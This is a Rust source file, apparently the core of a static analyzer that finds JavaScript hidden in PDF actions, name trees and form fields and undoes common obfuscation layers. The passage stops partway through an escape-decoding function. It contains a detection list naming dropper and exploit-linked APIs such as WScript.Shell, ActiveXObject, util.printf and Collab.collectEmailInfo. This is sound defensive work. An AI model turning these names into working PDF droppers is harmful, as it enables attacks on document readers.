//! gizza-ai/pdf-javascript-extractor core — locate every piece of JavaScript a
//! PDF can execute, recover its source, and unwind the obfuscation layers that
//! droppers habitually wrap it in.
//!
//! Where scripts hide (all of these are walked):
//!   * the document-level `/Names → /JavaScript` name tree (including nested
//!     `/Kids` nodes) — scripts the viewer runs when the document loads;
//!   * `/OpenAction` — the action that fires on open;
//!   * `/AA` additional-action dictionaries on the catalog, on pages, on
//!     annotations and on form fields, keyed by the event that triggers them;
//!   * annotation / form-field `/A` actions and their `/Next` action chains;
//!   * a catch-all sweep for any remaining object carrying a `/JS` entry.
//!
//! The source itself may be a PDF string (literal or hex, PDFDocEncoding or
//! UTF-16BE) or a stream (inflated through the declared filters by `lopdf`).
//! Once recovered it is run through iterated de-obfuscation passes —
//! `String.fromCharCode`, `unescape`/`decodeURIComponent`, `atob`, `\xNN` /
//! `\uNNNN` / octal string escapes, and literal concatenation — then optionally
//! beautified, scanned for suspicious Acrobat/JS API names, and mined for URLs.
//!
//! This is **static** analysis: nothing is executed, emulated, or fetched. The
//! de-obfuscator rewrites source text only; it makes no malware verdict.
//!
//! No wafer/wasm-bindgen deps: compiles natively for unit tests and to
//! `wasm32-wasip1`. `lopdf` (default-features=false) is the only engine dep;
//! the pretty-printer is reused from the shipped `js-beautify` tool's core.

use base64::Engine;
use lopdf::{Dictionary, Document, Object, ObjectId};
use serde::Serialize;
use std::collections::BTreeSet;

/// Hard cap on how many scripts are reported (a malformed or hostile document
/// can otherwise nest thousands of actions).
pub const MAX_SCRIPTS: usize = 64;
/// How many times the de-obfuscation passes are re-applied so nested layers
/// unwrap (`fromCharCode` inside `unescape` inside `atob` …).
const MAX_ROUNDS: usize = 4;
/// Action-chain / name-tree recursion limit.
const MAX_DEPTH: usize = 12;

/// Knobs the caller (chat schema / CLI) exposes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Options {
    /// Unwind `fromCharCode`/`unescape`/`atob`/escape/concat obfuscation.
    pub deobfuscate: bool,
    /// Re-indent the recovered source (obfuscated PDF JS is usually one line).
    pub beautify: bool,
    /// Also return the untouched extracted source for comparison.
    pub include_raw: bool,
    /// Per-script character cap on `source`/`raw`.
    pub max_script_chars: usize,
}

impl Default for Options {
    fn default() -> Self {
        Options {
            deobfuscate: true,
            beautify: true,
            include_raw: false,
            max_script_chars: 20_000,
        }
    }
}

/// One suspicious Acrobat/JavaScript API name found across the document.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Indicator {
    /// The API name, e.g. `app.launchURL`.
    pub name: String,
    /// Why an analyst cares.
    pub note: String,
    /// How many extracted scripts referenced it.
    pub script_count: usize,
}

/// One recovered script.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Default)]
pub struct Script {
    /// Position in the report (stable, 1-based).
    pub index: usize,
    /// Indirect object that carried the script, as `"12 0"`, or `"trailer"`
    /// when it lived in an inline dictionary reached from the trailer.
    pub object_id: String,
    /// What makes it run: `document-open`, `document-level`,
    /// `additional-action`, `annotation-action`, `form-field-action`, or
    /// `object-scan` (found by the catch-all sweep, trigger undetermined).
    pub trigger: String,
    /// Where in the object graph it was found, e.g. `/OpenAction`,
    /// `/Names/JavaScript`, `/Page[1]/Annots[0]/AA/E`.
    pub location: String,
    /// Name-tree entry name, when the script came from `/Names → /JavaScript`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// How the source was stored: `string` (a PDF string object) or `stream`
    /// (a stream object, inflated through its declared filters).
    pub source_kind: String,
    /// Character length of the extracted source BEFORE de-obfuscation or capping.
    pub length: usize,
    /// The reported source: de-obfuscated and beautified per `Options`. Omitted
    /// in `summary` mode.
    #[serde(skip_serializing_if = "String::is_empty")]
    pub source: String,
    /// The untouched extracted source (only when `include_raw`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub raw: Option<String>,
    /// Which de-obfuscation passes actually fired: `from-char-code`,
    /// `percent-unescape`, `base64-atob`, `string-escapes`, `string-concat`.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub decodings: Vec<String>,
    /// How many de-obfuscation rounds changed something (0 = already plain).
    pub rounds: usize,
    /// True when `source`/`raw` hit `max_script_chars`.
    pub truncated: bool,
    /// Suspicious API names referenced by this script.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub indicators: Vec<String>,
    /// URLs found in this script (after de-obfuscation).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub urls: Vec<String>,
}

/// The full extraction report for one PDF.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Default)]
pub struct Report {
    /// PDF header version, e.g. `1.7`.
    pub pdf_version: String,
    /// Number of indirect objects.
    pub object_count: usize,
    /// Number of pages.
    pub page_count: usize,
    /// True when the document is encrypted (`/Encrypt` in the trailer) — string
    /// and stream contents may be unreadable without the password.
    pub encrypted: bool,
    /// True when at least one script was recovered.
    pub has_javascript: bool,
    /// Number of scripts in `scripts`.
    pub script_count: usize,
    /// Every recovered script, document-open triggers first.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub scripts: Vec<Script>,
    /// Suspicious API names across all scripts, most-referenced first.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub indicators: Vec<Indicator>,
    /// De-duplicated URLs across all scripts.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub urls: Vec<String>,
    /// True when any script was capped, or the script list hit `MAX_SCRIPTS`.
    pub truncated: bool,
    /// Caveats worth showing the reader (encryption, caps).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
}

impl Report {
    /// Drop the bulky source bodies, keeping every piece of metadata (location,
    /// trigger, length, decodings, indicators, URLs). Backs `detail=summary`.
    pub fn summarized(mut self) -> Report {
        for s in &mut self.scripts {
            s.source.clear();
            s.raw = None;
        }
        self
    }
}

// --- suspicious API names ------------------------------------------------
// Substring matches against the de-obfuscated source. Names are the ones that
// recur in real PDF droppers and in the public write-ups on analyzing them.
const SUSPICIOUS: &[(&str, &str)] = &[
    ("eval", "evaluates a string as code — the usual landing point of an obfuscation chain"),
    ("unescape", "decodes %XX/%uXXXX blobs, a standard payload-hiding wrapper"),
    ("String.fromCharCode", "rebuilds a string from character codes to hide it from scanners"),
    ("atob", "decodes base64, another common payload wrapper"),
    ("app.launchURL", "makes the viewer open a URL"),
    ("app.openDoc", "opens another document from the viewer"),
    ("app.execMenuItem", "drives the viewer's own menu commands"),
    ("app.setTimeOut", "runs a string of code on a timer — an eval in disguise"),
    ("app.alert", "shows a dialog; often the harmless-looking probe in a test payload"),
    ("util.printf", "format-string API tied to a historical buffer-overflow exploit"),
    ("util.byteToChar", "byte-to-character conversion used when staging shellcode"),
    ("Collab.collectEmailInfo", "Acrobat API behind a well-known memory-corruption exploit"),
    ("Collab.getIcon", "Acrobat API behind a well-known memory-corruption exploit"),
    ("media.newPlayer", "multimedia API behind a well-known use-after-free exploit"),
    ("spell.customDictionaryOpen", "spell-check API behind a known memory-corruption exploit"),
    ("exportDataObject", "writes an embedded file out to disk — a dropper primitive"),
    ("importDataObject", "pulls an embedded file into the document"),
    ("getAnnots", "reads annotation contents, a common place to stash a second stage"),
    ("this.submitForm", "sends form data to a remote URL"),
    ("this.getURL", "fetches a URL from inside the document"),
    ("Net.HTTP.request", "makes an HTTP request from the viewer"),
    ("SOAP.connect", "opens a SOAP connection to a remote host"),
    ("ActiveXObject", "instantiates a Windows COM object — host-level code execution"),
    ("WScript.Shell", "Windows Script Host shell — runs commands on the host"),
    ("XMLHttpRequest", "makes an HTTP request"),
    ("Function(", "the Function constructor — an eval equivalent"),
];

/// Extract every script from a PDF.
///
/// Returns `Err` only when the bytes don't parse as a PDF. A PDF with no
/// JavaScript at all parses fine and yields `has_javascript = false` with an
/// empty `scripts` list.
pub fn extract(bytes: &[u8], opts: &Options) -> Result<Report, String> {
    let doc = Document::load_mem(bytes).map_err(|e| format!("failed to parse PDF: {e}"))?;

    let mut report = Report {
        pdf_version: doc.version.clone(),
        object_count: doc.objects.len(),
        page_count: doc.get_pages().len(),
        encrypted: doc.trailer.has(b"Encrypt"),
        ..Default::default()
    };

    let mut found: Vec<Found> = Vec::new();
    let mut seen_js: BTreeSet<String> = BTreeSet::new();
    let root_id = match doc.trailer.get(b"Root") {
        Ok(Object::Reference(id)) => Some(*id),
        _ => None,
    };

    // --- 1. the catalog: /OpenAction, /AA, the /Names JavaScript tree ---
    if let Ok(cat) = doc.catalog() {
        if let Ok(oa) = cat.get(b"OpenAction") {
            walk_action(
                &doc, oa, root_id, "document-open", "/OpenAction", None, &mut found, &mut seen_js, 0,
            );
        }
        if let Ok(aa) = cat.get(b"AA") {
            walk_aa(&doc, aa, root_id, "additional-action", "/AA", &mut found, &mut seen_js);
        }
        if let Ok(names) = cat.get(b"Names") {
            if let Some((Object::Dictionary(nd), nid)) = resolve(&doc, names, root_id) {
                if let Ok(js_tree) = nd.get(b"JavaScript") {
                    walk_name_tree(
                        &doc, js_tree, nid, "/Names/JavaScript", &mut found, &mut seen_js, 0,
                    );
                }
            }
        }
        if let Ok(af) = cat.get(b"AcroForm") {
            if let Some((Object::Dictionary(afd), afid)) = resolve(&doc, af, root_id) {
                if let Ok(fields) = afd.get(b"Fields") {
                    walk_fields(&doc, fields, afid, "/AcroForm/Fields", &mut found, &mut seen_js, 0);
                }
            }
        }
    }

    // --- 2. pages: page-level /AA plus every annotation's /A and /AA ---
    for (pageno, pid) in doc.get_pages() {
        let Ok(Object::Dictionary(pd)) = doc.get_object(pid) else {
            continue;
        };
        let base = format!("/Page[{pageno}]");
        if let Ok(aa) = pd.get(b"AA") {
            walk_aa(
                &doc,
                aa,
                Some(pid),
                "additional-action",
                &format!("{base}/AA"),
                &mut found,
                &mut seen_js,
            );
        }
        if let Ok(annots) = pd.get(b"Annots") {
            if let Some((Object::Array(list), _)) = resolve(&doc, annots, Some(pid)) {
                for (i, a) in list.iter().enumerate() {
                    let Some((Object::Dictionary(ad), aid)) = resolve(&doc, a, Some(pid)) else {
                        continue;
                    };
                    let aloc = format!("{base}/Annots[{i}]");
                    if let Ok(act) = ad.get(b"A") {
                        walk_action(
                            &doc,
                            act,
                            aid,
                            "annotation-action",
                            &format!("{aloc}/A"),
                            None,
                            &mut found,
                            &mut seen_js,
                            0,
                        );
                    }
                    if let Ok(aa) = ad.get(b"AA") {
                        walk_aa(
                            &doc,
                            aa,
                            aid,
                            "annotation-action",
                            &format!("{aloc}/AA"),
                            &mut found,
                            &mut seen_js,
                        );
                    }
                }
            }
        }
    }

    // --- 3. catch-all: any remaining object with a /JS entry ---
    let mut ids: Vec<ObjectId> = doc.objects.keys().copied().collect();
    ids.sort();
    for id in ids {
        let Some(d) = dict_of(&doc, id) else { continue };
        if !d.has(b"JS") {
            continue;
        }
        record(
            &doc,
            d,
            Some(id),
            "object-scan",
            &format!("object {} {}", id.0, id.1),
            None,
            &mut found,
            &mut seen_js,
        );
    }

    // --- 4. order, cap, decode ---
    found.sort_by_key(|f| (trigger_rank(f.trigger), f.location.clone()));
    if found.len() > MAX_SCRIPTS {
        found.truncate(MAX_SCRIPTS);
        report.truncated = true;
        report
            .notes
            .push(format!("script list capped at {MAX_SCRIPTS} entries"));
    }

    let mut all_urls: Vec<String> = Vec::new();
    let mut ind_counts: Vec<(usize, &'static str, &'static str)> = Vec::new();

    for (i, f) in found.into_iter().enumerate() {
        let mut passes: BTreeSet<&'static str> = BTreeSet::new();
        let (decoded, rounds) = if opts.deobfuscate {
            deobfuscate(&f.source, &mut passes)
        } else {
            (f.source.clone(), 0)
        };
        let shown = if opts.beautify {
            gizza_ai_js_beautify_core::beautify(&decoded, 2).unwrap_or(decoded.clone())
        } else {
            decoded.clone()
        };

        let mut urls: Vec<String> = Vec::new();
        extract_urls(&decoded, &mut urls);
        for u in &urls {
            push_unique(&mut all_urls, u.clone());
        }

        let mut hits: Vec<String> = Vec::new();
        for (name, note) in SUSPICIOUS {
            if decoded.contains(name) {
                hits.push(name.to_string());
                match ind_counts.iter_mut().find(|(_, n, _)| n == name) {
                    Some(e) => e.0 += 1,
                    None => ind_counts.push((1, name, note)),
                }
            }
        }

        let (source, cut_a) = cap(&shown, opts.max_script_chars);
        let (raw, cut_b) = if opts.include_raw {
            let (r, c) = cap(&f.source, opts.max_script_chars);
            (Some(r), c)
        } else {
            (None, false)
        };
        if cut_a || cut_b {
            report.truncated = true;
        }

        report.scripts.push(Script {
            index: i + 1,
            object_id: f.object_id,
            trigger: f.trigger.to_string(),
            location: f.location,
            name: f.name,
            source_kind: f.source_kind.to_string(),
            length: f.source.chars().count(),
            source,
            raw,
            decodings: passes.into_iter().map(|s| s.to_string()).collect(),
            rounds,
            truncated: cut_a || cut_b,
            indicators: hits,
            urls,
        });
    }

    ind_counts.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.1.cmp(b.1)));
    report.indicators = ind_counts
        .into_iter()
        .map(|(count, name, note)| Indicator {
            name: name.to_string(),
            note: note.to_string(),
            script_count: count,
        })
        .collect();

    report.script_count = report.scripts.len();
    report.has_javascript = report.script_count > 0;
    report.urls = all_urls;
    if report.truncated {
        report
            .notes
            .push("output was capped; raise max_script_chars for the full source".into());
    }
    if report.encrypted {
        report.notes.push(
            "the document is encrypted — strings and streams may be unreadable, so scripts can be \
             missed or come back as gibberish (decryption is out of scope)"
                .into(),
        );
    }
    if !report.has_javascript {
        report
            .notes
            .push("no JavaScript found in this document".into());
    }

    Ok(report)
}

// --- walking --------------------------------------------------------------

/// A script site collected during the walk, before decoding.
struct Found {
    object_id: String,
    trigger: &'static str,
    location: String,
    name: Option<String>,
    source_kind: &'static str,
    source: String,
}

fn trigger_rank(t: &str) -> u8 {
    match t {
        "document-open" => 0,
        "document-level" => 1,
        "additional-action" => 2,
        "annotation-action" => 3,
        "form-field-action" => 4,
        _ => 5,
    }
}

/// Follow one level of indirection, tracking which indirect object we're in.
fn resolve<'a>(
    doc: &'a Document,
    o: &'a Object,
    container: Option<ObjectId>,
) -> Option<(&'a Object, Option<ObjectId>)> {
    match o {
        Object::Reference(id) => doc.get_object(*id).ok().map(|r| (r, Some(*id))),
        other => Some((other, container)),
    }
}

/// The dictionary of an indirect object (a stream's dict counts).
fn dict_of(doc: &Document, id: ObjectId) -> Option<&Dictionary> {
    match doc.get_object(id) {
        Ok(Object::Dictionary(d)) => Some(d),
        Ok(Object::Stream(s)) => Some(&s.dict),
        _ => None,
    }
}

/// Walk an action dictionary (or a reference/array of them), recording any
/// JavaScript and following the `/Next` chain.
#[allow(clippy::too_many_arguments)]
fn walk_action(
    doc: &Document,
    obj: &Object,
    container: Option<ObjectId>,
    trigger: &'static str,
    location: &str,
    name: Option<String>,
    out: &mut Vec<Found>,
    seen: &mut BTreeSet<String>,
    depth: usize,
) {
    if depth > MAX_DEPTH {
        return;
    }
    let Some((resolved, id)) = resolve(doc, obj, container) else {
        return;
    };
    match resolved {
        Object::Array(items) => {
            for (i, it) in items.iter().enumerate() {
                walk_action(
                    doc,
                    it,
                    id,
                    trigger,
                    &format!("{location}[{i}]"),
                    name.clone(),
                    out,
                    seen,
                    depth + 1,
                );
            }
        }
        Object::Dictionary(d) => {
            record(doc, d, id, trigger, location, name.clone(), out, seen);
            if let Ok(next) = d.get(b"Next") {
                walk_action(
                    doc,
                    next,
                    id,
                    trigger,
                    &format!("{location}/Next"),
                    name,
                    out,
                    seen,
                    depth + 1,
                );
            }
        }
        _ => {}
    }
}

/// Walk an `/AA` additional-actions dictionary: every key is an event name.
fn walk_aa(
    doc: &Document,
    obj: &Object,
    container: Option<ObjectId>,
    trigger: &'static str,
    location: &str,
    out: &mut Vec<Found>,
    seen: &mut BTreeSet<String>,
) {
    let Some((Object::Dictionary(d), id)) = resolve(doc, obj, container) else {
        return;
    };
    for (key, val) in d.iter() {
        let ev = String::from_utf8_lossy(key);
        walk_action(
            doc,
            val,
            id,
            trigger,
            &format!("{location}/{ev}"),
            None,
            out,
            seen,
            0,
        );
    }
}

/// Walk a PDF name tree node: `/Names` is a flat `[name value name value …]`
/// array; `/Kids` points at further nodes.
fn walk_name_tree(
    doc: &Document,
    obj: &Object,
    container: Option<ObjectId>,
    location: &str,
    out: &mut Vec<Found>,
    seen: &mut BTreeSet<String>,
    depth: usize,
) {
    if depth > MAX_DEPTH {
        return;
    }
    let Some((Object::Dictionary(d), id)) = resolve(doc, obj, container) else {
        return;
    };
    if let Ok(names) = d.get(b"Names") {
        if let Some((Object::Array(pairs), pid)) = resolve(doc, names, id) {
            for pair in pairs.chunks(2) {
                let (key, val) = match pair {
                    [k, v] => (k, v),
                    _ => continue,
                };
                let entry = match key {
                    Object::String(b, _) => Some(decode_pdf_text(b)),
                    Object::Name(b) => Some(String::from_utf8_lossy(b).into_owned()),
                    _ => None,
                };
                walk_action(
                    doc,
                    val,
                    pid,
                    "document-level",
                    location,
                    entry,
                    out,
                    seen,
                    0,
                );
            }
        }
    }
    if let Ok(kids) = d.get(b"Kids") {
        if let Some((Object::Array(list), kid_container)) = resolve(doc, kids, id) {
            for k in list {
                walk_name_tree(doc, k, kid_container, location, out, seen, depth + 1);
            }
        }
    }
}

/// Walk `/AcroForm → /Fields`, including `/Kids` sub-trees; a field can carry
/// both an `/A` action and an `/AA` event dictionary.
fn walk_fields(
    doc: &Document,
    obj: &Object,
    container: Option<ObjectId>,
    location: &str,
    out: &mut Vec<Found>,
    seen: &mut BTreeSet<String>,
    depth: usize,
) {
    if depth > MAX_DEPTH {
        return;
    }
    let Some((Object::Array(list), lid)) = resolve(doc, obj, container) else {
        return;
    };
    for (i, f) in list.iter().enumerate() {
        let Some((Object::Dictionary(fd), fid)) = resolve(doc, f, lid) else {
            continue;
        };
        let floc = format!("{location}[{i}]");
        if let Ok(act) = fd.get(b"A") {
            walk_action(
                doc,
                act,
                fid,
                "form-field-action",
                &format!("{floc}/A"),
                None,
                out,
                seen,
                0,
            );
        }
        if let Ok(aa) = fd.get(b"AA") {
            walk_aa(
                doc,
                aa,
                fid,
                "form-field-action",
                &format!("{floc}/AA"),
                out,
                seen,
            );
        }
        if let Ok(kids) = fd.get(b"Kids") {
            walk_fields(doc, kids, fid, &format!("{floc}/Kids"), out, seen, depth + 1);
        }
    }
}

/// Record the `/JS` payload of one dictionary, if it has one and we haven't
/// already reported that exact object+source.
#[allow(clippy::too_many_arguments)]
fn record(
    doc: &Document,
    d: &Dictionary,
    id: Option<ObjectId>,
    trigger: &'static str,
    location: &str,
    name: Option<String>,
    out: &mut Vec<Found>,
    seen: &mut BTreeSet<String>,
) {
    let Some((source, kind)) = read_js(doc, d) else {
        return;
    };
    if source.trim().is_empty() {
        return;
    }
    let object_id = match id {
        Some(i) => format!("{} {}", i.0, i.1),
        None => "trailer".to_string(),
    };
    // De-dup on object + body: the same action object is commonly referenced
    // from several places (and the catch-all sweep re-visits everything).
    let key = format!("{object_id}\u{0}{source}");
    if !seen.insert(key) {
        return;
    }
    out.push(Found {
        object_id,
        trigger,
        location: location.to_string(),
        name,
        source_kind: kind,
        source,
    });
}

/// Read the JavaScript held under `/JS`: a PDF string, or a stream inflated
/// through its declared filters.
fn read_js(doc: &Document, d: &Dictionary) -> Option<(String, &'static str)> {
    let v = d.get(b"JS").ok()?;
    let (v, _) = resolve(doc, v, None)?;
    match v {
        Object::String(bytes, _) => Some((decode_pdf_text(bytes), "string")),
        Object::Stream(s) => {
            let content = s
                .decompressed_content()
                .unwrap_or_else(|_| s.content.clone());
            Some((decode_pdf_text(&content), "stream"))
        }
        _ => None,
    }
}

/// Decode PDF text bytes: UTF-16BE when the BOM is present, else
/// PDFDocEncoding/Latin-1 (byte == code point).
fn decode_pdf_text(bytes: &[u8]) -> String {
    if bytes.len() >= 2 && bytes[0] == 0xFE && bytes[1] == 0xFF {
        let u16s: Vec<u16> = bytes[2..]
            .chunks_exact(2)
            .map(|c| u16::from_be_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&u16s)
    } else if let Ok(s) = std::str::from_utf8(bytes) {
        s.to_string()
    } else {
        bytes.iter().map(|&b| b as char).collect()
    }
}

// --- de-obfuscation -------------------------------------------------------

type Pass = fn(&str) -> Option<String>;
const PASSES: &[(&str, Pass)] = &[
    ("from-char-code", pass_from_char_code),
    ("percent-unescape", pass_percent_unescape),
    ("base64-atob", pass_atob),
    ("string-escapes", pass_string_escapes),
    ("string-concat", pass_string_concat),
];

/// Apply every pass repeatedly until nothing changes (or `MAX_ROUNDS`).
/// Returns the rewritten source and the number of rounds that changed it;
/// `used` collects the names of the passes that actually fired.
pub fn deobfuscate(src: &str, used: &mut BTreeSet<&'static str>) -> (String, usize) {
    let mut cur = src.to_string();
    let mut rounds = 0;
    for _ in 0..MAX_ROUNDS {
        let mut changed = false;
        for (name, pass) in PASSES {
            if let Some(next) = pass(&cur) {
                if next != cur {
                    cur = next;
                    used.insert(name);
                    changed = true;
                }
            }
        }
        if !changed {
            break;
        }
        rounds += 1;
    }
    (cur, rounds)
}

/// Read a JS string literal starting at `chars[i]` (a quote). Returns the RAW
/// body (escapes still encoded) and the index just past the closing quote.
fn read_literal(chars: &[char], i: usize) -> Option<(String, usize)> {
    let quote = *chars.get(i)?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let mut body = String::new();
    let mut j = i + 1;
    while j < chars.len() {
        let c = chars[j];
        if c == '\\' {
            if j + 1 >= chars.len() {
                return None;
            }
            body.push(c);
            body.push(chars[j + 1]);
            j += 2;
            continue;
        }
        if c == quote {
            return Some((body, j + 1));
        }
        if c == '\n' {
            return None;
        }
        body.push(c);
        j += 1;
    }
    None
}

/// Emit `s` as a JS double-quoted literal. Control characters use `\u{..}` (an
/// ES6 escape the `string-escapes` pass deliberately does NOT match, so
/// re-quoting can never oscillate with decoding).
fn quote_js(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 || c as u32 == 0x7f => {
                out.push_str(&format!("\\u{{{:x}}}", c as u32))
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Skip spaces/tabs/newlines from `i`.
fn skip_ws(chars: &[char], mut i: usize) -> usize {
    while i < chars.len() && chars[i].is_whitespace() {
        i += 1;
    }
    i
}

/// Match a literal `needle` ending at `i` (i.e. `chars[i-needle..i]`).
fn ends_with_at(chars: &[char], i: usize, needle: &str) -> bool {
    let n: Vec<char> = needle.chars().collect();
    i >= n.len() && chars[i - n.len()..i] == n[..]
}

/// `String.fromCharCode(65, 0x42, …)` → `"AB"`. Only fires when every argument
/// is a plain decimal or `0x` hex integer literal.
fn pass_from_char_code(src: &str) -> Option<String> {
    const NEEDLE: &str = "fromCharCode";
    if !src.contains(NEEDLE) {
        return None;
    }
    let chars: Vec<char> = src.chars().collect();
    let mut out = String::with_capacity(src.len());
    let mut i = 0;
    let mut hit = false;
    while i < chars.len() {
        if chars[i] == 'f' && chars[i..].starts_with(&NEEDLE.chars().collect::<Vec<_>>()[..]) {
            let after = skip_ws(&chars, i + NEEDLE.chars().count());
            if after < chars.len() && chars[after] == '(' {
                if let Some((args, end)) = read_call_args(&chars, after) {
                    if let Some(text) = char_codes_to_string(&args) {
                        // Drop a preceding `String.` / `window.String.` qualifier.
                        let mut start = i;
                        if ends_with_at(&chars, start, ".") {
                            let mut k = start - 1;
                            while k > 0 && (chars[k - 1].is_alphanumeric() || chars[k - 1] == '_' || chars[k - 1] == '$' || chars[k - 1] == '.') {
                                k -= 1;
                            }
                            let removed: String = chars[k..start - 1].iter().collect();
                            if removed.ends_with("String") {
                                let cut = out.chars().count() - (start - k);
                                out = out.chars().take(cut).collect();
                                start = k;
                            }
                        }
                        if wraps_whole_literal(&chars, start, end) {
                            // The call was the entire body of an enclosing
                            // literal; consume its quotes so the replacement
                            // does not end up double-quoted.
                            out.pop();
                            i = end + 1;
                        } else {
                            i = end;
                        }
                        out.push_str(&quote_js(&text));
                        hit = true;
                        continue;
                    }
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    hit.then_some(out)
}

/// True when `[start, end)` is exactly the body of a string literal, i.e. the
/// span is wrapped in matching quotes. A pass that swaps such a span for a
/// fresh literal would otherwise emit doubled quotes (`""app.alert(1)""`), so
/// callers drop the surrounding quotes and let the replacement supply them.
fn wraps_whole_literal(chars: &[char], start: usize, end: usize) -> bool {
    start > 0
        && end < chars.len()
        && (chars[start - 1] == '"' || chars[start - 1] == '\'')
        && chars[end] == chars[start - 1]
}

/// Read the argument text of a call whose `(` is at `open`. Returns the raw
/// argument slice and the index just past the matching `)`. Bails on nesting
/// deeper than one level or on unbalanced input.
fn read_call_args(chars: &[char], open: usize) -> Option<(String, usize)> {
    let mut depth = 0usize;
    let mut j = open;
    let mut body = String::new();
    while j < chars.len() {
        let c = chars[j];
        if c == '"' || c == '\'' {
            let (lit, next) = read_literal(chars, j)?;
            body.push(c);
            body.push_str(&lit);
            body.push(c);
            j = next;
            continue;
        }
        if c == '(' {
            depth += 1;
            if depth > 1 {
                return None;
            }
            j += 1;
            continue;
        }
        if c == ')' {
            depth -= 1;
            if depth == 0 {
                return Some((body, j + 1));
            }
            j += 1;
            continue;
        }
        body.push(c);
        j += 1;
    }
    None
}

/// Turn a `fromCharCode` argument list into text, or `None` if any argument
/// isn't a plain integer literal.
fn char_codes_to_string(args: &str) -> Option<String> {
    let mut out = String::new();
    let mut any = false;
    for part in args.split(',') {
        let t = part.trim();
        if t.is_empty() {
            return None;
        }
        let v = if let Some(h) = t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
            u32::from_str_radix(h, 16).ok()?
        } else {
            t.parse::<u32>().ok()?
        };
        out.push(char::from_u32(v)?);
        any = true;
    }
    any.then_some(out)
}

/// `unescape("%61%70")` / `decodeURIComponent("…")` → `"ap"`.
fn pass_percent_unescape(src: &str) -> Option<String> {
    rewrite_string_call(src, &["unescape", "decodeURIComponent"], |lit| {
        let decoded = percent_decode(lit);
        (decoded != lit).then_some(decoded)
    })
}

/// `atob("YWJj")` → `"abc"`.
fn pass_atob(src: &str) -> Option<String> {
    rewrite_string_call(src, &["atob"], |lit| {
        base64::engine::general_purpose::STANDARD
            .decode(lit.trim())
            .ok()
            .map(|b| String::from_utf8_lossy(&b).into_owned())
    })
}

/// Shared driver for `name("<literal>")` → `"<decoded>"` rewrites.
fn rewrite_string_call(
    src: &str,
    names: &[&str],
    decode: impl Fn(&str) -> Option<String>,
) -> Option<String> {
    if !names.iter().any(|n| src.contains(n)) {
        return None;
    }
    let chars: Vec<char> = src.chars().collect();
    let mut out = String::with_capacity(src.len());
    let mut i = 0;
    let mut hit = false;
    'outer: while i < chars.len() {
        for name in names {
            let nc: Vec<char> = name.chars().collect();
            if chars[i..].starts_with(&nc[..]) {
                // Must be a whole identifier, not the tail of a longer one.
                let prev_ok = i == 0 || !(chars[i - 1].is_alphanumeric() || chars[i - 1] == '_' || chars[i - 1] == '$');
                let after = skip_ws(&chars, i + nc.len());
                if prev_ok && after < chars.len() && chars[after] == '(' {
                    let arg_start = skip_ws(&chars, after + 1);
                    if let Some((lit, after_lit)) = read_literal(&chars, arg_start) {
                        let close = skip_ws(&chars, after_lit);
                        if close < chars.len() && chars[close] == ')' {
                            if let Some(text) = decode(&lit) {
                                let end = close + 1;
                                if wraps_whole_literal(&chars, i, end) {
                                    out.pop();
                                    i = end + 1;
                                } else {
                                    i = end;
                                }
                                out.push_str(&quote_js(&text));
                                hit = true;
                                continue 'outer;
                            }
                        }
                    }
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    hit.then_some(out)
}

/// Decode `%XX` and `%uXXXX` sequences; everything else passes through.
fn percent_decode(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut bytes: Vec<u8> = Vec::new();
    let mut i = 0;
    // %XX runs are collected as bytes so multi-byte UTF-8 survives.
    macro_rules! flush {
        () => {
            if !bytes.is_empty() {
                out.push_str(&String::from_utf8_lossy(&bytes));
                bytes.clear();
            }
        };
    }
    while i < chars.len() {
        if chars[i] == '%' && i + 5 < chars.len() && (chars[i + 1] == 'u' || chars[i + 1] == 'U') {
            let hex: String = chars[i + 2..i + 6].iter().collect();
            if let Ok(v) = u32::from_str_radix(&hex, 16) {
                if let Some(c) = char::from_u32(v) {
                    flush!();
                    out.push(c);
                    i += 6;
                    continue;
                }
            }
        }
        if chars[i] == '%' && i + 2 < chars.len() {
            let hex: String = chars[i + 1..i + 3].iter().collect();
            if let Ok(v) = u8::from_str_radix(&hex, 16) {
                bytes.push(v);
                i += 3;
                continue;
            }
        }
        flush!();
        out.push(chars[i]);
        i += 1;
    }
    flush!();
    out
}

/// Decode `\xNN`, `\uNNNN` and octal `\NNN` escapes inside string literals.
fn pass_string_escapes(src: &str) -> Option<String> {
    if !src.contains('\\') {
        return None;
    }
    let chars: Vec<char> = src.chars().collect();
    let mut out = String::with_capacity(src.len());
    let mut i = 0;
    let mut hit = false;
    while i < chars.len() {
        if chars[i] == '"' || chars[i] == '\'' {
            if let Some((lit, next)) = read_literal(&chars, i) {
                if let Some(decoded) = decode_escapes(&lit) {
                    out.push_str(&quote_js(&decoded));
                    i = next;
                    hit = true;
                    continue;
                }
                let q = chars[i];
                out.push(q);
                out.push_str(&lit);
                out.push(q);
                i = next;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    hit.then_some(out)
}

/// Decode the numeric escapes of one literal body, returning `None` when it
/// holds none (so the literal is left byte-for-byte alone).
fn decode_escapes(body: &str) -> Option<String> {
    let chars: Vec<char> = body.chars().collect();
